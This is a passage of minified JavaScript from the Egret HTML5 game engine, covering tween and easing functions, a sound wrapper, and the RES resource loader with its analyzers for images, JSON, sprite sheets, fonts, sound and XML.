				p0 : this._cloneProps(this._curQueueProps),
				e : c,
				p1 : this._cloneProps(this._appendQueueProps(a))
			})
		};
		c.prototype.call = function (a, b, c) {
			"undefined" === typeof b && (b = void 0);
			"undefined" === typeof c && (c = void 0);
			return this._addAction({
				f : a,
				p : c ? c : [],
				o : b ? b : this._target
			})
		};
		c.prototype.set = function (a,
			b) {
			"undefined" === typeof b && (b = null);
			return this._addAction({
				f : this._set,
				o : this,
				p : [a, b ? b : this._target]
			})
		};
		c.prototype.play = function (a) {
			a || (a = this);
			return this.call(a.setPaused, a, [!1])
		};
		c.prototype.pause = function (a) {
			a || (a = this);
			return this.call(a.setPaused, a, [!0])
		};
		c.prototype.tick = function (a) {
			this.paused || this.setPosition(this._prevPosition + a)
		};
		c.NONE = 0;
		c.LOOP = 1;
		c.REVERSE = 2;
		c._tweens = [];
		c.IGNORE = {};
		c._plugins = {};
		c._inited = !1;
		return c
	}
	(d.EventDispatcher);
	d.Tween = e;
	e.prototype.__class__ = "egret.Tween"
})(egret ||
	(egret = {}));
(function (d) {
	var e = function () {
		function e() {
			d.Logger.fatal("Ease\u4e0d\u80fd\u88ab\u5b9e\u4f8b\u5316")
		}
		e.get = function (c) {
			-1 > c && (c = -1);
			1 < c && (c = 1);
			return function (a) {
				return 0 == c ? a : 0 > c ? a * (a * -c + 1 + c) : a * ((2 - a) * c + (1 - c))
			}
		};
		e.getPowIn = function (c) {
			return function (a) {
				return Math.pow(a, c)
			}
		};
		e.getPowOut = function (c) {
			return function (a) {
				return 1 - Math.pow(1 - a, c)
			}
		};
		e.getPowInOut = function (c) {
			return function (a) {
				return 1 > (a *= 2) ? 0.5 * Math.pow(a, c) : 1 - 0.5 * Math.abs(Math.pow(2 - a, c))
			}
		};
		e.sineIn = function (c) {
			return 1 - Math.cos(c *
				Math.PI / 2)
		};
		e.sineOut = function (c) {
			return Math.sin(c * Math.PI / 2)
		};
		e.sineInOut = function (c) {
			return -0.5 * (Math.cos(Math.PI * c) - 1)
		};
		e.getBackIn = function (c) {
			return function (a) {
				return a * a * ((c + 1) * a - c)
			}
		};
		e.getBackOut = function (c) {
			return function (a) {
				a -= 1;
				return a * a * ((c + 1) * a + c) + 1
			}
		};
		e.getBackInOut = function (c) {
			c *= 1.525;
			return function (a) {
				return 1 > (a *= 2) ? 0.5 * a * a * ((c + 1) * a - c) : 0.5 * ((a -= 2) * a * ((c + 1) * a + c) + 2)
			}
		};
		e.circIn = function (c) {
			return  - (Math.sqrt(1 - c * c) - 1)
		};
		e.circOut = function (c) {
			return Math.sqrt(1 - c * c)
		};
		e.circInOut = function (c) {
			return 1 >
			(c *= 2) ? -0.5 * (Math.sqrt(1 - c * c) - 1) : 0.5 * (Math.sqrt(1 - (c -= 2) * c) + 1)
		};
		e.bounceIn = function (c) {
			return 1 - e.bounceOut(1 - c)
		};
		e.bounceOut = function (c) {
			return c < 1 / 2.75 ? 7.5625 * c * c : c < 2 / 2.75 ? 7.5625 * (c -= 1.5 / 2.75) * c + 0.75 : c < 2.5 / 2.75 ? 7.5625 * (c -= 2.25 / 2.75) * c + 0.9375 : 7.5625 * (c -= 2.625 / 2.75) * c + 0.984375
		};
		e.bounceInOut = function (c) {
			return 0.5 > c ? 0.5 * e.bounceIn(2 * c) : 0.5 * e.bounceOut(2 * c - 1) + 0.5
		};
		e.getElasticIn = function (c, a) {
			var b = 2 * Math.PI;
			return function (d) {
				if (0 == d || 1 == d)
					return d;
				var e = a / b * Math.asin(1 / c);
				return  - (c * Math.pow(2, 10 *
						(d -= 1)) * Math.sin((d - e) * b / a))
			}
		};
		e.getElasticOut = function (c, a) {
			var b = 2 * Math.PI;
			return function (d) {
				if (0 == d || 1 == d)
					return d;
				var e = a / b * Math.asin(1 / c);
				return c * Math.pow(2, -10 * d) * Math.sin((d - e) * b / a) + 1
			}
		};
		e.getElasticInOut = function (c, a) {
			var b = 2 * Math.PI;
			return function (d) {
				var e = a / b * Math.asin(1 / c);
				return 1 > (d *= 2) ? -0.5 * c * Math.pow(2, 10 * (d -= 1)) * Math.sin((d - e) * b / a) : c * Math.pow(2, -10 * (d -= 1)) * Math.sin((d - e) * b / a) * 0.5 + 1
			}
		};
		e.quadIn = e.getPowIn(2);
		e.quadOut = e.getPowOut(2);
		e.quadInOut = e.getPowInOut(2);
		e.cubicIn = e.getPowIn(3);
		e.cubicOut = e.getPowOut(3);
		e.cubicInOut = e.getPowInOut(3);
		e.quartIn = e.getPowIn(4);
		e.quartOut = e.getPowOut(4);
		e.quartInOut = e.getPowInOut(4);
		e.quintIn = e.getPowIn(5);
		e.quintOut = e.getPowOut(5);
		e.quintInOut = e.getPowInOut(5);
		e.backIn = e.getBackIn(1.7);
		e.backOut = e.getBackOut(1.7);
		e.backInOut = e.getBackInOut(1.7);
		e.elasticIn = e.getElasticIn(1, 0.3);
		e.elasticOut = e.getElasticOut(1, 0.3);
		e.elasticInOut = e.getElasticInOut(1, 0.3 * 1.5);
		return e
	}
	();
	d.Ease = e;
	e.prototype.__class__ = "egret.Ease"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.prototype.play = function (c) {
			"undefined" === typeof c && (c = !1);
			var a = this.audio;
			a && (isNaN(a.duration) || (a.currentTime = 0), a.loop = c, a.play())
		};
		d.prototype.pause = function () {
			var c = this.audio;
			c && c.pause()
		};
		d.prototype.load = function () {
			var c = this.audio;
			c && c.load()
		};
		d.prototype.addEventListener = function (c, a) {
			this.audio && this.audio.addEventListener(c, a, !1)
		};
		d.prototype.removeEventListener = function (c, a) {
			this.audio && this.audio.removeEventListener(c, a, !1)
		};
		d.prototype.setVolume =
		function (c) {
			var a = this.audio;
			a && (a.volume = c)
		};
		d.prototype.getVolume = function () {
			return this.audio ? this.audio.volume : 0
		};
		return d
	}
	();
	d.Sound = e;
	e.prototype.__class__ = "egret.Sound"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.isNumber = function (c) {
			return "number" === typeof c && !isNaN(c)
		};
		return d
	}
	();
	d.NumberUtils = e;
	e.prototype.__class__ = "egret.NumberUtils"
})(egret || (egret = {}));
var __extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
}, RES;
(function (d) {
	var e = function (d) {
		function c(a, b, c) {
			"undefined" === typeof b && (b = !1);
			"undefined" === typeof c && (c = !1);
			d.call(this, a, b, c);
			this.itemsTotal = this.itemsLoaded = 0
		}
		__extends(c, d);
		c.dispatchResourceEvent = function (a, b, d, e, f, h) {
			"undefined" === typeof d && (d = "");
			"undefined" === typeof e && (e = null);
			"undefined" === typeof f && (f = 0);
			"undefined" === typeof h && (h = 0);
			var g = egret.Event._getPropertyData(c);
			g.groupName = d;
			g.resItem = e;
			g.itemsLoaded = f;
			g.itemsTotal = h;
			egret.Event._dispatchByTarget(c, a, b, g)
		};
		c.ITEM_LOAD_ERROR =
			"itemLoadError";
		c.CONFIG_COMPLETE = "configComplete";
		c.GROUP_PROGRESS = "groupProgress";
		c.GROUP_COMPLETE = "groupComplete";
		return c
	}
	(egret.Event);
	d.ResourceEvent = e;
	e.prototype.__class__ = "RES.ResourceEvent"
})(RES || (RES = {}));
(function (d) {
	var e = function () {
		function d(c, a, b) {
			this._loaded = !1;
			this.name = c;
			this.url = a;
			this.type = b
		}
		Object.defineProperty(d.prototype, "loaded", {
			get : function () {
				return this.data ? this.data.loaded : this._loaded
			},
			set : function (c) {
				this.data && (this.data.loaded = c);
				this._loaded = c
			},
			enumerable : !0,
			configurable : !0
		});
		d.prototype.toString = function () {
			return '[ResourceItem name="' + this.name + '" url="' + this.url + '" type="' + this.type + '"]'
		};
		d.TYPE_XML = "xml";
		d.TYPE_IMAGE = "image";
		d.TYPE_BIN = "bin";
		d.TYPE_TEXT = "text";
		d.TYPE_JSON =
			"json";
		d.TYPE_SHEET = "sheet";
		d.TYPE_FONT = "font";
		d.TYPE_SOUND = "sound";
		return d
	}
	();
	d.ResourceItem = e;
	e.prototype.__class__ = "RES.ResourceItem"
})(RES || (RES = {}));
(function (d) {
	var e = function () {
		function e() {
			this.keyMap = {};
			this.groupDic = {}

		}
		e.prototype.getGroupByName = function (c) {
			var a = [];
			if (!this.groupDic[c])
				return a;
			c = this.groupDic[c];
			for (var b = c.length, d = 0; d < b; d++)
				a.push(this.parseResourceItem(c[d]));
			return a
		};
		e.prototype.getRawGroupByName = function (c) {
			return this.groupDic[c] ? this.groupDic[c] : []
		};
		e.prototype.createGroup = function (c, a, b) {
			"undefined" === typeof b && (b = !1);
			if (!b && this.groupDic[c] || !a || 0 == a.length)
				return !1;
			b = this.groupDic;
			for (var d = [], e = a.length, f = 0; f <
				e; f++) {
				var h = a[f],
				g = b[h];
				if (g)
					for (var h = g.length, l = 0; l < h; l++) {
						var k = g[l];
						-1 == d.indexOf(k) && d.push(k)
					}
				else (k = this.keyMap[h]) && -1 == d.indexOf(k) && d.push(k)
			}
			if (0 == d.length)
				return !1;
			this.groupDic[c] = d;
			return !0
		};
		e.prototype.parseConfig = function (c, a) {
			if (c) {
				var b = c.resources;
				if (b)
					for (var d = b.length, e = 0; e < d; e++) {
						var f = b[e],
						h = f.url;
						h && -1 == h.indexOf("://") && (f.url = a + h);
						this.addItemToKeyMap(f)
					}
				if (b = c.groups)
					for (d = b.length, e = 0; e < d; e++) {
						for (var h = b[e], g = [], l = h.keys.split(","), k = l.length, n = 0; n < k; n++)
							f = l[n].trim(),
							(f = this.keyMap[f]) && -1 == g.indexOf(f) && g.push(f);
						this.groupDic[h.name] = g
					}
			}
		};
		e.prototype.addItemToKeyMap = function (c) {
			this.keyMap[c.name] || (this.keyMap[c.name] = c);
			if (c.hasOwnProperty("subkeys")) {
				var a = c.subkeys.split(",");
				c.subkeys = a;
				for (var b = a.length, d = 0; d < b; d++) {
					var e = a[d];
					null == this.keyMap[e] && (this.keyMap[e] = c)
				}
			}
		};
		e.prototype.getName = function (c) {
			return (c = this.keyMap[c]) ? c.name : ""
		};
		e.prototype.getType = function (c) {
			return (c = this.keyMap[c]) ? c.type : ""
		};
		e.prototype.getRawResourceItem = function (c) {
			return this.keyMap[c]
		};
		e.prototype.getResourceItem = function (c) {
			return (c = this.keyMap[c]) ? this.parseResourceItem(c) : null
		};
		e.prototype.parseResourceItem = function (c) {
			var a = new d.ResourceItem(c.name, c.url, c.type);
			a.data = c;
			return a
		};
		return e
	}
	();
	d.ResourceConfig = e;
	e.prototype.__class__ = "RES.ResourceConfig"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.thread = 2;
			this.loadingCount = 0;
			this.groupTotalDic = {};
			this.numLoadedDic = {};
			this.itemListDic = {};
			this.priorityQueue = {};
			this.lazyLoadList = [];
			this.analyzerDic = {};
			this.queueIndex = 0
		}
		__extends(c, e);
		c.prototype.isGroupInLoading = function (a) {
			return void 0 !== this.itemListDic[a]
		};
		c.prototype.loadGroup = function (a, b, c) {
			"undefined" === typeof c && (c = 0);
			if (!this.itemListDic[b] && b)
				if (a && 0 != a.length) {
					this.priorityQueue[c] ? this.priorityQueue[c].push(b) : this.priorityQueue[c] =
						[b];
					this.itemListDic[b] = a;
					c = a.length;
					for (var e = 0; e < c; e++)
						a[e].groupName = b;
					this.groupTotalDic[b] = a.length;
					this.numLoadedDic[b] = 0;
					this.next()
				} else
					a = new d.ResourceEvent(d.ResourceEvent.GROUP_COMPLETE), a.groupName = b, this.dispatchEvent(a)
		};
		c.prototype.loadItem = function (a) {
			this.lazyLoadList.push(a);
			a.groupName = "";
			this.next()
		};
		c.prototype.next = function () {
			for (; this.loadingCount < this.thread; ) {
				var a = this.getOneResourceItem();
				if (!a)
					break;
				this.loadingCount++;
				if (a.loaded)
					this.onItemComplete(a);
				else {
					var b = this.analyzerDic[a.type];
					b || (b = this.analyzerDic[a.type] = egret.Injector.getInstance(d.AnalyzerBase, a.type));
					b.loadFile(a, this.onItemComplete, this)
				}
			}
		};
		c.prototype.getOneResourceItem = function () {
			var a = Number.NEGATIVE_INFINITY,
			b;
			for (b in this.priorityQueue)
				a = Math.max(a, b);
			a = this.priorityQueue[a];
			if (!a || 0 == a.length)
				return 0 == this.lazyLoadList.length ? null : this.lazyLoadList.pop();
			b = a.length;
			for (var c, d = 0; d < b; d++) {
				this.queueIndex >= b && (this.queueIndex = 0);
				c = this.itemListDic[a[this.queueIndex]];
				if (0 < c.length)
					break;
				this.queueIndex++
			}
			return 0 ==
			c.length ? null : c.shift()
		};
		c.prototype.onItemComplete = function (a) {
			this.loadingCount--;
			var b = a.groupName;
			a.loaded || d.ResourceEvent.dispatchResourceEvent(this.resInstance, d.ResourceEvent.ITEM_LOAD_ERROR, b, a);
			if (b) {
				this.numLoadedDic[b]++;
				var c = this.numLoadedDic[b],
				e = this.groupTotalDic[b];
				d.ResourceEvent.dispatchResourceEvent(this.resInstance, d.ResourceEvent.GROUP_PROGRESS, b, a, c, e);
				c == e && (this.removeGroupName(b), delete this.groupTotalDic[b], delete this.numLoadedDic[b], delete this.itemListDic[b], d.ResourceEvent.dispatchResourceEvent(this,
						d.ResourceEvent.GROUP_COMPLETE, b))
			} else
				this.callBack.call(this.resInstance, a);
			this.next()
		};
		c.prototype.removeGroupName = function (a) {
			for (var b in this.priorityQueue) {
				for (var c = this.priorityQueue[b], d = c.length, e = 0, f = !1, d = c.length, g = 0; g < d; g++) {
					if (c[g] == a) {
						c.splice(e, 1);
						f = !0;
						break
					}
					e++
				}
				if (f) {
					0 == c.length && delete this.priorityQueue[b];
					break
				}
			}
		};
		return c
	}
	(egret.EventDispatcher);
	d.ResourceLoader = e;
	e.prototype.__class__ = "RES.ResourceLoader"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this)
		}
		__extends(c, d);
		c.prototype.loadFile = function (a, b, c) {};
		c.prototype.getRes = function (a) {};
		c.prototype.destroyRes = function (a) {
			return !1
		};
		c.getStringPrefix = function (a) {
			if (!a)
				return "";
			var b = a.indexOf(".");
			return -1 != b ? a.substring(0, b) : ""
		};
		c.getStringTail = function (a) {
			if (!a)
				return "";
			var b = a.indexOf(".");
			return -1 != b ? a.substring(b + 1) : ""
		};
		return c
	}
	(egret.HashObject);
	d.AnalyzerBase = e;
	e.prototype.__class__ = "RES.AnalyzerBase"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this.fileDic = {};
			this.resItemDic = [];
			this._dataFormat = egret.URLLoaderDataFormat.BINARY;
			this.recycler = new egret.Recycler
		}
		__extends(c, d);
		c.prototype.loadFile = function (a, b, c) {
			if (this.fileDic[a.name])
				b.call(c, a);
			else {
				var d = this.getLoader();
				this.resItemDic[d.hashCode] = {
					item : a,
					func : b,
					thisObject : c
				};
				d.load(new egret.URLRequest(a.url))
			}
		};
		c.prototype.getLoader = function () {
			var a = this.recycler.pop();
			a || (a = new egret.URLLoader, a.addEventListener(egret.Event.COMPLETE,
					this.onLoadFinish, this), a.addEventListener(egret.IOErrorEvent.IO_ERROR, this.onLoadFinish, this));
			a.dataFormat = this._dataFormat;
			return a
		};
		c.prototype.onLoadFinish = function (a) {
			var b = a.target,
			c = this.resItemDic[b.hashCode];
			delete this.resItemDic[b.hashCode];
			this.recycler.push(b);
			var d = c.item,
			e = c.func;
			d.loaded = a.type == egret.Event.COMPLETE;
			d.loaded && this.analyzeData(d, b.data);
			e.call(c.thisObject, d)
		};
		c.prototype.analyzeData = function (a, b) {
			var c = a.name;
			!this.fileDic[c] && b && (this.fileDic[c] = b)
		};
		c.prototype.getRes =
		function (a) {
			return this.fileDic[a]
		};
		c.prototype.hasRes = function (a) {
			return null != this.getRes(a)
		};
		c.prototype.destroyRes = function (a) {
			return this.fileDic[a] ? (delete this.fileDic[a], !0) : !1
		};
		return c
	}
	(d.AnalyzerBase);
	d.BinAnalyzer = e;
	e.prototype.__class__ = "RES.BinAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this._dataFormat = egret.URLLoaderDataFormat.TEXTURE
		}
		__extends(c, d);
		c.prototype.analyzeData = function (a, b) {
			var c = a.name;
			!this.fileDic[c] && b && (this.fileDic[c] = b, (c = a.data) && c.scale9grid && (c = c.scale9grid.split(","), b.scale9Grid = new egret.Rectangle(parseInt(c[0]), parseInt(c[1]), parseInt(c[2]), parseInt(c[3]))))
		};
		return c
	}
	(d.BinAnalyzer);
	d.ImageAnalyzer = e;
	e.prototype.__class__ = "RES.ImageAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this._dataFormat = egret.URLLoaderDataFormat.TEXT
		}
		__extends(c, d);
		c.prototype.analyzeData = function (a, b) {
			var c = a.name;
			if (!this.fileDic[c] && b)
				try {
					this.fileDic[c] = JSON.parse(b)
				} catch (d) {
					egret.Logger.warning("JSON\u6587\u4ef6\u683c\u5f0f\u4e0d\u6b63\u786e: " + a.url)
				}
		};
		return c
	}
	(d.BinAnalyzer);
	d.JsonAnalyzer = e;
	e.prototype.__class__ = "RES.JsonAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this._dataFormat = egret.URLLoaderDataFormat.TEXT
		}
		__extends(c, d);
		return c
	}
	(d.BinAnalyzer);
	d.TextAnalyzer = e;
	e.prototype.__class__ = "RES.TextAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.sheetMap = {};
			this.textureMap = {};
			this._dataFormat = egret.URLLoaderDataFormat.TEXT
		}
		__extends(c, e);
		c.prototype.getRes = function (a) {
			var b = this.fileDic[a];
			b || (b = this.textureMap[a]);
			!b && (b = d.AnalyzerBase.getStringPrefix(a), b = this.fileDic[b]) && (a = d.AnalyzerBase.getStringTail(a), b = b.getTexture(a));
			return b
		};
		c.prototype.onLoadFinish = function (a) {
			var b = a.target,
			c = this.resItemDic[b.hashCode];
			delete this.resItemDic[b.hashCode];
			this.recycler.push(b);
			var d =
				c.item,
			e = c.func;
			d.loaded = a.type == egret.Event.COMPLETE;
			d.loaded && this.analyzeData(d, b.data);
			"string" == typeof b.data ? (this._dataFormat = egret.URLLoaderDataFormat.TEXTURE, this.loadFile(d, e, c.thisObject), this._dataFormat = egret.URLLoaderDataFormat.TEXT) : e.call(c.thisObject, d)
		};
		c.prototype.analyzeData = function (a, b) {
			var c = a.name;
			if (!this.fileDic[c] && b) {
				var d;
				if ("string" == typeof b) {
					try {
						d = JSON.parse(b)
					} catch (e) {
						egret.Logger.warning("JSON\u6587\u4ef6\u683c\u5f0f\u4e0d\u6b63\u786e: " + a.url)
					}
					d && (this.sheetMap[c] =
							d, a.loaded = !1, a.url = this.getRelativePath(a.url, d.file))
				} else
					d = this.sheetMap[c], delete this.sheetMap[c], b && (d = this.parseSpriteSheet(b, d), this.fileDic[c] = d)
			}
		};
		c.prototype.getRelativePath = function (a, b) {
			a = a.split("\\").join("/");
			var c = a.lastIndexOf("/");
			return a = -1 != c ? a.substring(0, c + 1) + b : b
		};
		c.prototype.parseSpriteSheet = function (a, b) {
			var c = b.frames;
			if (!c)
				return null;
			var d = new egret.SpriteSheet(a),
			e = this.textureMap,
			f;
			for (f in c) {
				var g = c[f];
				a = d.createTexture(f, g.x, g.y, g.w, g.h, g.offX, g.offY, g.sourceW, g.sourceH);
				null == e[f] && (e[f] = a)
			}
			return d
		};
		return c
	}
	(d.BinAnalyzer);
	d.SheetAnalyzer = e;
	e.prototype.__class__ = "RES.SheetAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this)
		}
		__extends(c, d);
		c.prototype.analyzeData = function (a, b) {
			var c = a.name;
			if (!this.fileDic[c] && b) {
				var d;
				"string" == typeof b ? (d = b, this.sheetMap[c] = d, a.loaded = !1, a.url = this.getTexturePath(a.url, d)) : (d = this.sheetMap[c], delete this.sheetMap[c], b && (d = new egret.BitmapTextSpriteSheet(b, d), this.fileDic[c] = d))
			}
		};
		c.prototype.getTexturePath = function (a, b) {
			var c = "",
			d = b.split("\n")[2],
			e = d.indexOf('file="');
			-1 != e && (d = d.substring(e + 6), e = d.indexOf('"'), c = d.substring(0,
						e));
			a = a.split("\\").join("/");
			e = a.lastIndexOf("/");
			return a = -1 != e ? a.substring(0, e + 1) + c : c
		};
		return c
	}
	(d.SheetAnalyzer);
	d.FontAnalyzer = e;
	e.prototype.__class__ = "RES.FontAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this._dataFormat = egret.URLLoaderDataFormat.SOUND
		}
		__extends(c, d);
		return c
	}
	(d.BinAnalyzer);
	d.SoundAnalyzer = e;
	e.prototype.__class__ = "RES.SoundAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this._dataFormat = egret.URLLoaderDataFormat.TEXT
		}
		__extends(c, d);
		c.prototype.analyzeData = function (a, b) {
			var c = a.name;
			if (!this.fileDic[c] && b)
				try {
					var d = egret.XML.parse(b);
					this.fileDic[c] = d
				} catch (e) {}

		};
		return c
	}
	(d.BinAnalyzer);
	d.XMLAnalyzer = e;
	e.prototype.__class__ = "RES.XMLAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	d.loadConfig = function (c, a, b) {
		"undefined" === typeof a && (a = "");
		"undefined" === typeof b && (b = "json");
		f.loadConfig(c, a, b)
	};
	d.loadGroup = function (c, a) {
		"undefined" === typeof a && (a = 0);
		f.loadGroup(c, a)
	};
	d.isGroupLoaded = function (c) {
		return f.isGroupLoaded(c)
	};
	d.getGroupByName = function (c) {
		return f.getGroupByName(c)
	};
	d.createGroup = function (c, a, b) {
		"undefined" === typeof b && (b = !1);
		return f.createGroup(c, a, b)
	};
	d.hasRes = function (c) {
		return f.hasRes(c)
	};
	d.getRes = function (c) {
		return f.getRes(c)
	};
	d.getResAsync =
	function (c, a, b) {
		f.getResAsync(c, a, b)
	};
	d.getResByUrl = function (c, a, b, d) {
		"undefined" === typeof d && (d = "");
		f.getResByUrl(c, a, b, d)
	};
	d.destroyRes = function (c) {
		return f.destroyRes(c)
	};
	d.setMaxLoadingThread = function (c) {
		f.setMaxLoadingThread(c)
	};
	d.addEventListener = function (c, a, b, d, e) {
		"undefined" === typeof d && (d = !1);
		"undefined" === typeof e && (e = 0);
		f.addEventListener(c, a, b, d, e)
	};
	d.removeEventListener = function (c, a, b, d) {
		"undefined" === typeof d && (d = !1);
		f.removeEventListener(c, a, b, d)
	};
	var e = function (c) {
		function a() {
			c.call(this);
			this.analyzerDic = {};
			this.configItemList = [];
			this.configComplete = this.callLaterFlag = !1;
			this.loadedGroups = [];
			this.groupNameList = [];
			this.asyncDic = {};
			this.init()
		}
		__extends(a, c);
		a.prototype.getAnalyzerByType = function (b) {
			var a = this.analyzerDic[b];
			a || (a = this.analyzerDic[b] = egret.Injector.getInstance(d.AnalyzerBase, b));
			return a
		};
		a.prototype.init = function () {
			egret.Injector.hasMapRule(d.AnalyzerBase, d.ResourceItem.TYPE_BIN) || egret.Injector.mapClass(d.AnalyzerBase, d.BinAnalyzer, d.ResourceItem.TYPE_BIN);
			egret.Injector.hasMapRule(d.AnalyzerBase,
				d.ResourceItem.TYPE_IMAGE) || egret.Injector.mapClass(d.AnalyzerBase, d.ImageAnalyzer, d.ResourceItem.TYPE_IMAGE);
			egret.Injector.hasMapRule(d.AnalyzerBase, d.ResourceItem.TYPE_TEXT) || egret.Injector.mapClass(d.AnalyzerBase, d.TextAnalyzer, d.ResourceItem.TYPE_TEXT);
			egret.Injector.hasMapRule(d.AnalyzerBase, d.ResourceItem.TYPE_JSON) || egret.Injector.mapClass(d.AnalyzerBase, d.JsonAnalyzer, d.ResourceItem.TYPE_JSON);
			egret.Injector.hasMapRule(d.AnalyzerBase, d.ResourceItem.TYPE_SHEET) || egret.Injector.mapClass(d.AnalyzerBase,
				d.SheetAnalyzer, d.ResourceItem.TYPE_SHEET);
			egret.Injector.hasMapRule(d.AnalyzerBase, d.ResourceItem.TYPE_FONT) || egret.Injector.mapClass(d.AnalyzerBase, d.FontAnalyzer, d.ResourceItem.TYPE_FONT);
			egret.Injector.hasMapRule(d.AnalyzerBase, d.ResourceItem.TYPE_SOUND) || egret.Injector.mapClass(d.AnalyzerBase, d.SoundAnalyzer, d.ResourceItem.TYPE_SOUND);
			egret.Injector.hasMapRule(d.AnalyzerBase, d.ResourceItem.TYPE_XML) || egret.Injector.mapClass(d.AnalyzerBase, d.XMLAnalyzer, d.ResourceItem.TYPE_XML);
			this.resConfig =
				new d.ResourceConfig;
			this.resLoader = new d.ResourceLoader;
			this.resLoader.callBack = this.onResourceItemComp;
			this.resLoader.resInstance = this;
			this.resLoader.addEventListener(d.ResourceEvent.GROUP_COMPLETE, this.onGroupComp, this)
		};
		a.prototype.loadConfig = function (b, a, c) {
			"undefined" === typeof c && (c = "json");
			this.configItemList.push({
				url : b,
				resourceRoot : a,
				type : c
			});
			this.callLaterFlag || (egret.callLater(this.startLoadConfig, this), this.callLaterFlag = !0)
		};
		a.prototype.startLoadConfig = function () {
			this.callLaterFlag = !1;
			var b = this.configItemList;
			this.configItemList = [];
			this.loadingConfigList = b;
			for (var c = b.length, e = [], f = 0; f < c; f++) {
				var h = b[f],
				h = new d.ResourceItem(h.url, h.url, h.type);
				e.push(h)
			}
			this.resLoader.loadGroup(e, a.GROUP_CONFIG, Number.MAX_VALUE)
		};
		a.prototype.isGroupLoaded = function (b) {
			return -1 != this.loadedGroups.indexOf(b)
		};
		a.prototype.getGroupByName = function (b) {
			return this.resConfig.getGroupByName(b)
		};
		a.prototype.loadGroup = function (b, a) {
			"undefined" === typeof a && (a = 0);
			if (-1 == this.loadedGroups.indexOf(b) && !this.resLoader.isGroupInLoading(b))
				if (this.configComplete) {
					var c =
						this.resConfig.getGroupByName(b);
					this.resLoader.loadGroup(c, b, a)
				} else
					this.groupNameList.push({
						name : b,
						priority : a
					})
		};
		a.prototype.createGroup = function (b, a, c) {
			"undefined" === typeof c && (c = !1);
			if (c) {
				var d = this.loadedGroups.indexOf(b);
				-1 != d && this.loadedGroups.splice(d, 1)
			}
			return this.resConfig.createGroup(b, a, c)
		};
		a.prototype.onGroupComp = function (b) {
			if (b.groupName == a.GROUP_CONFIG) {
				b = this.loadingConfigList.length;
				for (var c = 0; c < b; c++) {
					var e = this.loadingConfigList[c],
					f = this.getAnalyzerByType(e.type),
					h = f.getRes(e.url);
					f.destroyRes(e.url);
					this.resConfig.parseConfig(h, e.resourceRoot)
				}
				this.configComplete = !0;
				this.loadingConfigList = null;
				d.ResourceEvent.dispatchResourceEvent(this, d.ResourceEvent.CONFIG_COMPLETE);
				e = this.groupNameList;
				b = e.length;
				for (c = 0; c < b; c++)
					f = e[c], this.loadGroup(f.name, f.priority);
				this.groupNameList = []
			} else
				this.loadedGroups.push(b.groupName), this.dispatchEvent(b)
		};
		a.prototype.hasRes = function (b) {
			var a = this.resConfig.getType(b);
			return "" == a && (b = d.AnalyzerBase.getStringPrefix(b), a = this.resConfig.getType(b),
				"" == a) ? !1 : !0
		};
		a.prototype.getRes = function (b) {
			var a = this.resConfig.getType(b);
			return "" == a && (a = d.AnalyzerBase.getStringPrefix(b), a = this.resConfig.getType(a), "" == a) ? null : this.getAnalyzerByType(a).getRes(b)
		};
		a.prototype.getResAsync = function (b, a, c) {
			var e = this.resConfig.getType(b),
			f = this.resConfig.getName(b);
